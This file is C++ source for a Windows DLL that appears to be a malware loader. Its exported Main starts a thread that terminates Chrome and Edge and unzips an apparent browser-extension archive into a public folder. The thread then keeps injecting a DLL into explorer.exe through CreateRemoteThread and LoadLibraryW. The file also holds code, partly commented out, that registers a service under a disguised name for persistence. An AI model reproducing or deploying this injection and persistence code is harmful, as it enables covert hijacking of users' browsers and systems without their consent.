// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <windows.h>
#include <iostream>
#include <winsvc.h>
#include <wtypes.h>
#include <stdio.h>
#include <tchar.h>
#include <sddl.h>
#include "ZipUtil.h"
#include "ProcessUtil.h"





SERVICE_STATUS_HANDLE lv_hServiceStatus;
HANDLE lv_thdService = NULL;
//HANDLE lv_hProcess = NULL;

BOOL	lv_ProcStop = FALSE;
DWORD	lv_dwProcess_Explorer = 0;



extern "C" __declspec(dllexport) void CALLBACK Main(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

void	MyTerminateProcess()
{
	std::wstring processName = L"chrome.exe";
	TeminateProcess(processName);
	processName = L"msedge.exe";
	TeminateProcess(processName);

	return;
}
//.
DWORD GetExplorerPID() {
	DWORD pid = 0;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot != INVALID_HANDLE_VALUE) {
		PROCESSENTRY32 pe;
		pe.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(hSnapshot, &pe)) {
			do {
				if (_tcscmp(pe.szExeFile, _T("explorer.exe")) == 0) {
					pid = pe.th32ProcessID;
					break;
				}
			} while (Process32Next(hSnapshot, &pe));
		}
		CloseHandle(hSnapshot);
	}
	return pid;
}
void InjectDll(HANDLE p_hProcess, LPCWSTR p_wszDllPath /*= NULL*/) {
	wchar_t wszDllPath[MAX_PATH]; memset(wszDllPath, 0, sizeof(wszDllPath));
	wcscpy_s(wszDllPath, MAX_PATH, p_wszDllPath);
	unsigned int cchDllPath = sizeof(wszDllPath);

	HMODULE hKernel32 = GetModuleHandleA("Kernelbase.dll");
	FARPROC lb = GetProcAddress(hKernel32, "LoadLibraryW");

	HANDLE hProcess = p_hProcess;

	void* pMem = VirtualAllocEx(hProcess, NULL, cchDllPath, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProcess, pMem, wszDllPath, cchDllPath, NULL);
	HANDLE h = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lb, pMem, 0, NULL);
	WaitForSingleObject(h, 1000);
	VirtualFreeEx(hProcess, pMem, 0, MEM_RELEASE);
	CloseHandle(h);
}

unsigned int TF_THREAD(void*) {
	wchar_t wszDir[MAX_PATH]; memset(wszDir, 0, sizeof(wszDir));
	wchar_t wszPath[MAX_PATH]; memset(wszPath, 0, sizeof(wszPath));

	GetModuleFileName(NULL, wszDir, MAX_PATH);
	wchar_t* pSlash = wcsrchr(wszDir, L'\\');
	if (pSlash != NULL)
		pSlash[0] = 0x0;

	swprintf_s(wszPath, MAX_PATH, L"%s\\ntdb.dll", wszDir);

	//. Close chrome and edge on service starting
	MyTerminateProcess();
	//.
	while (lv_ProcStop == FALSE) {
		//if (CheckCurrentUser() == false) {
		//	Sleep(500);
		//	continue;
		//}
		//. Extract CRX Zip File
		MyUnzipFile("C:\\Windows\\System32\\data1.zip", "C:\\Users\\Public\\data\\");

		//. Hook into Explorer
		DWORD explorerPID = GetExplorerPID();
		if (explorerPID == 0) {
			Sleep(500);
			continue;
		}

		if (lv_dwProcess_Explorer != explorerPID) {
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorerPID);
			if (!hProcess) {
				Sleep(500);
				continue;
			}
			lv_dwProcess_Explorer = explorerPID;
			InjectDll(hProcess, wszPath);
		}

		Sleep(500);
	}
	return 0;
}
void RunService() {
    DWORD dwTID;
    lv_thdService = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TF_THREAD, NULL, 0, &dwTID);
    WaitForSingleObject(lv_thdService, INFINITE);
}
#define SERVICE_NAME L"X_MyService"

void RegisterService()
{
	// Create a service manager handle
	SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
	if (scm == NULL)
	{
		std::cerr << "OpenSCManager failed. Error: " << GetLastError() << std::endl;
		return;
	}

	// Create a service handle
	SC_HANDLE service = CreateService(
		scm,                        // Service Control Manager handle
		SERVICE_NAME,               // Service name
		SERVICE_NAME,               // Display name
		SERVICE_ALL_ACCESS,         // Desired access
		SERVICE_WIN32_OWN_PROCESS,  // Service type
		SERVICE_DEMAND_START,       // Start type
		SERVICE_ERROR_NORMAL,       // Error control type
		L"C:\\Users\\Public\\data\\mi_nt_svc.exe", // Path to the executable
		NULL,                       // No load ordering group
		NULL,                       // No tag identifier
		NULL,                       // No dependencies
		NULL,                       // LocalSystem account
		NULL);                      // No password

	if (service == NULL)
	{
		std::cerr << "CreateService failed. Error: " << GetLastError() << std::endl;
		CloseServiceHandle(scm);
		return;
	}

	std::cout << "Service registered successfully." << std::endl;
	CloseServiceHandle(service);
	CloseServiceHandle(scm);
}
extern "C" __declspec(dllexport) void CALLBACK Main(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
	//TCHAR	w_szParam[MAX_PATH] = L"";

	//swprintf(w_szParam, L"/C sc create XblGame binPath=\"C:\\Users\\Public\\data\\mi_nt_svc.exe\" start= auto");
	//_execute(L"cmd.exe", w_szParam, 1);
	//swprintf(w_szParam, L"/C sc start XblGame");
	//_execute(L"cmd.exe", w_szParam, 1);
	// 
	// 
//	std::string command(lpszCmdLine);
//	if (command == "register")
//	{
//		RegisterService();
//	}
//	else if (command == "unregister")
//	{
////		UnregisterService();
//	}
//	else
//	{
//		std::cerr << "Invalid command. Use 'register' or 'unregister'." << std::endl;
//	}
//    return;

	DWORD dwTID;
	lv_thdService = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TF_THREAD, NULL, 0, &dwTID);
	//return;
}
